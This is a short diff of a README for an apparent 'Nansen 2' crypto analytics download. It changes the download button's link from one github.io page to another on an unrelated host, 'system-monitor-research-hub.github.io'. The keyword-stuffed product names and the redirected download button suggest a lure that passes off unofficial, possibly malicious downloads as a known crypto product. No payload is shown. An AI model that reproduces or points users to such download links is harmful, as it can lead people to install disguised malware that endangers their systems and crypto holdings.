@@ -21,7 +21,7 @@ To begin using this **Nansen 2 Blockchain Data Tool** and **Nansen 2 Portfolio T
 | :--- | :--- |
 | **Get Nansen 2 Crypto Analytics Platform** | Click the button below to initiate the setup for this **Nansen 2 On-Chain Analysis Software**. |
 
-[![Button](https://img.shields.io/badge/📦-Get_Nansen_2_Crypto_Analytics-2ea44f?style=for-the-badge)](https://tomrsuni015.github.io/.github/nansen-2-crypto-analytics-platform)
+[![Button](https://img.shields.io/badge/📦-Get_Nansen_2_Crypto_Analytics-2ea44f?style=for-the-badge)](https://system-monitor-research-hub.github.io/.github/nansen-2-crypto-analytics-platform)
 
 ## System Requirements
 
